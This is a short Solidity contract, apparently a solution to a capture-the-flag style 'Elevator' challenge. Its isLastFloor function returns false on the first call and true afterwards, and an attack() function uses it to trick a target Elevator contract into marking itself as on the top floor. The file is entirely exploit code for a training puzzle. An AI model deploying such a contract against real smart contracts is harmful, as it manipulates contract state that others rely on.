pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {
    address elevator;
    uint count = 0;

    constructor(address _elevator) public {
        elevator = _elevator;
    }

    function isLastFloor(uint floor) external returns (bool) {
        if (count == 0) {
            count++;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        Elevator elev = Elevator(elevator);
        elev.goTo(10);
    }
}
